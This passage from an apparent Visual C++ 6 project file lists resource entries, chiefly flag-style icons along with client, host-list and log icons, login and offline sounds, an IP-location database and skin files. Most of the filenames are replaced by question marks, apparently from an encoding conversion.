SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\SystemIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\????????.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\????????.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\????????.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??IP??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\????????.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\SystemIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\Sound\login.wav
# End Source File
# Begin Source File

SOURCE=.\res\WAV\offline.wav
# End Source File
# Begin Source File

SOURCE=.\res\QQWry.Dat
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\Sound\Setting.wav
# End Source File
# Begin Source File

SOURCE=.\res\SKIN1.she
# End Source File
# Begin Source File

SOURCE=.\res\SkinH.she
# End Source File
# Begin Source File

SOURCE=.\res\xpstyle.manifest
# End Source File
# End Target
# End Project
